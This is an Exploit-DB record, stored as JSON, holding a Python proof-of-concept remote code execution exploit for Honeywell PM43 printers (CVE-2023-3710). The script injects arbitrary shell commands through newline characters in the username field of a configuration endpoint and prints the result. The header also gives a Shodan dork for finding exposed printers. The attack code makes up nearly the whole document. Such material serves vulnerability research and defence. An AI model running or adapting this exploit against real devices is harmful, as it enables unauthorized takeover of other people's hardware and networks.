{"source": "https://www.exploit-db.com/exploits/51885", "vulnName": "Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE)", "vulnEDBID": "51885", "vulnCVE": "2023-3710", "author": "BYTEHUNTER", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2024-03-14", "vulnContent": "#- Exploit Title: Honeywell PM43 < P10.19.050004 - Remote Code Execution (RCE)\n#- Shodan Dork: http.title:PM43 , PM43\n#- Exploit Author: ByteHunter\n#- Email: 0xByteHunter@proton.me\n#- Frimware Version: versions prior to P10.19.050004\n#- Tested on: P10.17.019667\n#- CVE : CVE-2023-3710\n\n\nimport requests\nimport argparse\n\nBLUE = '\\033[94m'\nYELLOW = '\\033[93m'\nRESET = '\\033[0m'\n\ndef banner():\n    banner = \"\"\"\n    \u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557\n        CVE-2023-3710   \n        Command Injection in Honeywell PM43 Printers\n        Author: ByteHunter      \n    \u255a\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255d\n    \"\"\"\n    print(YELLOW + banner + RESET)\n\n\ndef run_command(url, command):\n    full_url = f\"{url}/loadfile.lp?pageid=Configure\"\n    payload = {\n        'username': f'hunt\\n{command}\\n',\n        'userpassword': 'admin12345admin!!'\n    }\n    try:\n        response = requests.post(full_url, data=payload, verify=False)\n        response_text = response.text\n        html_start_index = response_text.find('<html>')\n        if html_start_index != -1:\n            return response_text[:html_start_index]\n        else:\n            return response_text  \n    except requests.exceptions.RequestException as e:\n        return f\"Error: {e}\"\n\ndef main():\n    parser = argparse.ArgumentParser(description='Command Injection PoC for Honeywell PM43 Printers')\n    parser.add_argument('--url', dest='url', help='Target URL', required=True)\n    parser.add_argument('--run', dest='command', help='Command to execute', required=True)\n\n    args = parser.parse_args()\n\n    response = run_command(args.url, args.command)\n    print(f\"{BLUE}{response}{RESET}\")\n\nif __name__ == \"__main__\":\n    banner()\n    main()\n            "}